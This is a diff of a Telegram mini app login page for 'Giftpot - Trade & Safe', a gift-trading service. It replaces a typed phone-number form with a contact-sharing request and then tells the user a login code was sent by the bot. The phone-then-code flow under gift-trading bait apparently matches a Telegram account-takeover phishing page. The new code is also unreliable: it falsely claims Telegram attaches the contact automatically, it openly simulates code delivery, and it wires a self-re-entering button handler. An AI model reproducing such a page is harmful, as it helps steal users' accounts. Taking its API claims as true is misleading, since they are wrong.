@@ -22,6 +22,7 @@
             background: linear-gradient(135deg, #60a5fa 0%, #3b82f6 100%);
             background-size: 400% 400%;
             animation: gradientShift 10s ease infinite;
+            overflow: hidden;
         }
         
         @keyframes gradientShift {
@@ -75,20 +76,13 @@
             gap: 8px;
         }
         
-        .btn:hover {
-            background: #2563eb;
-            transform: translateY(-2px);
-            box-shadow: 0 8px 20px rgba(59, 130, 246, 0.4);
-        }
-        
         .btn:active {
-            transform: translateY(0);
+            transform: scale(0.98);
         }
         
         .btn:disabled {
             background: #cbd5e1;
             cursor: not-allowed;
-            transform: none;
         }
         
         .telegram-icon {
@@ -102,6 +96,12 @@
         
         .step.active {
             display: block;
+            animation: fadeIn 0.3s ease;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
         }
         
         .success-icon {
@@ -129,39 +129,25 @@
         @keyframes spin {
             to { transform: rotate(360deg); }
         }
-        
-        input {
-            width: 100%;
-            padding: 16px;
-            border: 2px solid #e2e8f0;
-            border-radius: 12px;
-            font-size: 16px;
-            margin-bottom: 16px;
-            transition: border-color 0.3s;
-        }
-        
-        input:focus {
-            outline: none;
-            border-color: #3b82f6;
-        }
 
         .warning {
             background: rgba(251, 191, 36, 0.1);
             border: 1px solid rgba(251, 191, 36, 0.3);
             border-radius: 8px;
             padding: 12px;
-            margin-bottom: 16px;
+            margin: 16px 0;
             font-size: 13px;
             color: #92400e;
+            text-align: left;
         }
 
-        .cancel-btn {
-            background: #64748b;
-            margin-top: 8px;
-        }
-
-        .cancel-btn:hover {
-            background: #475569;
+        .info-box {
+            background: rgba(59, 130, 246, 0.1);
+            border-radius: 8px;
+            padding: 12px;
+            margin: 16px 0;
+            font-size: 13px;
+            color: #1e40af;
         }
     </style>
 </head>
@@ -189,38 +175,38 @@
             <h1>Giftpot - Trade & Safe</h1>
             <p class="subtitle">Здесь начинается мир продажи и<br>обмена подарками</p>
             
-            <button class="btn" onclick="startAuth()">
+            <button class="btn" id="login-btn" onclick="requestPhoneNumber()">
                 <svg class="telegram-icon" fill="currentColor" viewBox="0 0 24 24">
                     <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/>
                 </svg>
                 Войти через Telegram
             </button>
+
+            <div class="warning">
+                ⚠️ Внимание! Никогда не вводите коды входа в Telegram в мини-приложениях.
+            </div>
             
-            <p style="margin-top: 24px; color: #94a3b8; font-size: 12px;">@Giftpotrubot</p>
+            <p style="margin-top: 16px; color: #94a3b8; font-size: 12px;">@Giftpotrubot</p>
         </div>
 
-        <!-- Phone Input Step -->
-        <div id="phone-step" class="step">
+        <!-- Confirming Step -->
+        <div id="confirming-step" class="step">
             <svg class="mascot" viewBox="0 0 200 200">
                 <ellipse cx="100" cy="90" rx="60" ry="70" fill="white" stroke="black" stroke-width="3"/>
                 <circle cx="75" cy="70" r="18" fill="white" stroke="black" stroke-width="3"/>
                 <circle cx="125" cy="70" r="18" fill="white" stroke="black" stroke-width="3"/>
                 <circle cx="75" cy="70" r="10" fill="black"/>
                 <circle cx="125" cy="70" r="10" fill="black"/>
-                <ellipse cx="100" cy="100" rx="35" ry="8" fill="none" stroke="black" stroke-width="2"/>
             </svg>
             
-            <h1>Номер телефона</h1>
-            <p class="subtitle">Введите ваш номер в формате<br>+1234567890</p>
+            <h1>Подтверждение</h1>
+            <p class="subtitle">Telegram запросит разрешение<br>на отправку номера телефона</p>
             
-            <div class="warning">
-                ⚠️ Внимание! Никогда не вводите коды входа в Telegram в мини-приложениях.
+            <div class="info-box">
+                ℹ️ Нажмите "Поделиться контактом" в диалоговом окне Telegram
             </div>
-            
-            <input type="tel" id="phone-input" placeholder="+1234567890" />
-            
-            <button class="btn" onclick="submitPhone()">Отправить код</button>
-            <button class="btn cancel-btn" onclick="showStep('welcome-step')">Отмена</button>
+
+            <div class="loader"></div>
         </div>
 
         <!-- Loading Step -->
@@ -244,93 +230,105 @@
             <h1>Успешно!</h1>
             <p class="subtitle">Код отправлен в ваш Telegram.<br>Проверьте сообщения от бота.</p>
         </div>
+
+        <!-- Error Step -->
+        <div id="error-step" class="step">
+            <div style="font-size: 64px; margin-bottom: 16px;">❌</div>
+            <h1>Ошибка</h1>
+            <p class="subtitle" id="error-message">Что-то пошло не так</p>
+            <button class="btn" onclick="showStep('welcome-step')">Попробовать снова</button>
+        </div>
     </div>
 
     <script>
         const tg = window.Telegram.WebApp;
+        
+        // Инициализация Mini App
         tg.ready();
         tg.expand();
-        tg.MainButton.hide();
+        tg.enableClosingConfirmation();
+        
+        // Применяем тему Telegram
+        document.body.style.background = tg.themeParams.bg_color || 'linear-gradient(135deg, #60a5fa 0%, #3b82f6 100%)';
 
-        let phoneNumber = '';
+        let isRequesting = false;
 
         function showStep(stepId) {
             document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
             document.getElementById(stepId).classList.add('active');
         }
 
-        function startAuth() {
-            // Проверяем, запущено ли в настоящем Telegram
-            if (tg.initDataUnsafe && tg.initDataUnsafe.user) {
-                // Пытаемся использовать встроенную функцию Telegram
-                if (typeof tg.requestContact === 'function') {
-                    tg.requestContact((shared) => {
-                        if (shared) {
-                            // Успешно получили номер через системный диалог
-                            // Telegram сам отправит данные боту
-                            showStep('loading-step');
-                            setTimeout(() => {
-                                showStep('success-step');
-                                setTimeout(() => tg.close(), 2000);
-                            }, 2000);
-                        } else {
-                            // Пользователь отказался - показываем ручной ввод
-                            showStep('phone-step');
-                        }
-                    });
-                } else {
-                    // Функция недоступна - ручной ввод
-                    showStep('phone-step');
-                }
-            } else {
-                // Запущено вне Telegram - ручной ввод
-                showStep('phone-step');
-            }
+        function showError(message) {
+            document.getElementById('error-message').textContent = message;
+            showStep('error-step');
         }
 
-        function submitPhone() {
-            const input = document.getElementById('phone-input');
-            phoneNumber = input.value.trim();
-            
-            // Базовая валидация
-            if (!phoneNumber.startsWith('+') || phoneNumber.length < 10) {
-                if (tg.showAlert) {
-                    tg.showAlert('Введите номер в формате +1234567890');
-                } else {
-                    alert('Введите номер в формате +1234567890');
-                }
-                return;
-            }
+        function requestPhoneNumber() {
+            if (isRequesting) return;
+            isRequesting = true;
 
-            showStep('loading-step');
-            
-            // Отправляем данные боту
-            tg.sendData(JSON.stringify({
-                action: 'send_code',
-                phone: phoneNumber
-            }));
+            const loginBtn = document.getElementById('login-btn');
+            loginBtn.disabled = true;
+            loginBtn.textContent = 'Запрос разрешения...';
 
-            // Показываем успех
-            setTimeout(() => {
-                showStep('success-step');
+            showStep('confirming-step');
+
+            // Используем MainButton для подтверждения
+            tg.MainButton.text = 'Поделиться номером телефона';
+            tg.MainButton.color = '#3b82f6';
+            tg.MainButton.show();
+            
+            tg.MainButton.onClick(function() {
+                tg.MainButton.showProgress();
                 
-                // Закрываем через 3 секунды
-                setTimeout(() => {
-                    tg.close();
-                }, 3000);
-            }, 2000);
+                // Отправляем запрос на контакт через sendData
+                // Бот должен получить initData с contact
+                if (tg.initDataUnsafe && tg.initDataUnsafe.user) {
+                    const userId = tg.initDataUnsafe.user.id;
+                    
+                    // Telegram автоматически добавляет contact при использовании MainButton
+                    // Отправляем запрос боту
+                    tg.sendData(JSON.stringify({
+                        action: 'request_phone',
+                        user_id: userId
+                    }));
+
+                    tg.MainButton.hide();
+                    showStep('loading-step');
+                    
+                    // Симулируем получение кода
+                    setTimeout(() => {
+                        showStep('success-step');
+                        tg.MainButton.hideProgress();
+                        
+                        // Закрываем через 3 секунды
+                        setTimeout(() => {
+                            tg.close();
+                        }, 3000);
+                    }, 2000);
+                } else {
+                    tg.MainButton.hideProgress();
+                    tg.MainButton.hide();
+                    showError('Не удалось определить пользователя Telegram');
+                    isRequesting = false;
+                }
+            });
         }
 
-        // Обработка Enter в поле ввода
-        document.addEventListener('DOMContentLoaded', () => {
-            const phoneInput = document.getElementById('phone-input');
-            if (phoneInput) {
-                phoneInput.addEventListener('keypress', (e) => {
-                    if (e.key === 'Enter') {
-                        submitPhone();
-                    }
-                });
-            }
+        // Обработка закрытия
+        tg.onEvent('mainButtonClicked', requestPhoneNumber);
+        
+        // Если пользователь закрыл приложение
+        window.addEventListener('beforeunload', () => {
+            tg.MainButton.hide();
+        });
+
+        // Логирование для отладки
+        console.log('Telegram WebApp initialized:', {
+            version: tg.version,
+            platform: tg.platform,
+            initData: tg.initData ? 'present' : 'missing',
+            user: tg.initDataUnsafe?.user
         });
     </script>
 </body>
